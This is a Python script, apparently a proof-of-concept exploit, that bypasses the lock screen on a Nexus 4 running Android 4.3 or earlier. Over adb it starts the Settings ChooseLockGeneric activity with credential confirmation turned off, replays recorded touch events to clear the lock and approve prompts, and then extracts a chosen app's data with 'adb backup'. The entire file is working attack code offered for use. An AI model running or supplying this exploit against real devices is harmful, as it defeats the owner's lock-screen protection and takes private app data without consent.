#!/usr/bin/env python

import sys
import time
import subprocess

def log(msg):
    print '[+] ' + msg

def fail(msg):
    sys.stderr.writelines('[+] ERROR: %s' % msg)
    sys.exit(-1)

def find_device():
    proc = subprocess.Popen('adb devices', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc.communicate()

    devices = []
    for line in out.split('\n'):
        if line.split('\t')[-1] == 'device':
            devices.append(line.split('\t')[0])
        elif line.split('\t')[-1] == 'unauthorized':
            fail('An unauthorized Android device is found: %s.' % line.split('\t')[0])

    if len(devices) == 0:
        fail('No Android device is found!')
    elif len(devices) > 1:
        fail('More than 1 Android devices are found.')
    else:
        log('An Android device is found: %s.' % devices[0])

def verify_device():
    proc = subprocess.Popen('adb shell getprop ro.product.device', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc.communicate()
    if out.strip() != 'mako':
        fail('This exploit is only valid for Nexus 4.')

    proc = subprocess.Popen('adb shell getprop ro.build.version.release', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc.communicate()
    if out.strip() > '4.3':
        fail('This exploit is only valid for Android <= 4.3.')

def emulate_user_click(dat):
    conv = lambda x: str(int(x, 16))
    for line in open(dat, 'r').readlines():
        params = line.strip().split(' ')
        if len(params) != 3:
            continue
        params = [conv(n) for n in params]
        cmd = 'adb shell sendevent /dev/input/event2 %s' % ' '.join(params)
        subprocess.Popen(cmd, shell=True).communicate()

def toggle_screen():
    subprocess.Popen('adb shell input keyevent 26', shell=True).communicate()
    time.sleep(1)

def get_logcats():
    proc = subprocess.Popen('adb shell logcat -d', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc.communicate()
    return out.split('\n')

def unlock_screen():
    subprocess.Popen('adb shell logcat -c', shell=True).communicate()

    toggle_screen()

    is_locked = False
    is_sleeping = False
    for line in get_logcats():
        if line.find('Waking up from sleep') != -1:
            is_sleeping = False
        if line.find('Lock screen displayed') != -1:
            is_locked = True
        if line.find('Going to sleep') != -1:
            is_sleeping = True

    if is_sleeping:
        subprocess.Popen('adb shell logcat -c', shell=True).communicate()
        toggle_screen()
        for line in get_logcats():
            if line.find('Lock screen displayed') != -1:
                is_locked = True

    if is_locked:
        # unlock it!
        subprocess.Popen('adb shell am start -n com.android.settings/.ChooseLockGeneric --ez confirm_credentials false --ei "lockscreen.password_type" 0', shell=True, stdout=subprocess.PIPE).communicate()
        time.sleep(1)

        toggle_screen()
        toggle_screen()

        emulate_user_click('slip.dat')
        time.sleep(2)
        log('The device is unlocked now.')

def backup_app(package):
    cmd = 'adb backup %s' % package
    subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    time.sleep(2)
    emulate_user_click('confirm.dat')
    log('Backup data of %s' % package)

def main():
    if len(sys.argv) != 2:
        print 'Usage: %s <package>' % sys.argv[0]
        sys.exit(-1)

    find_device()
    verify_device()
    unlock_screen()
    backup_app(sys.argv[1])


if  __name__ == '__main__':
    main()
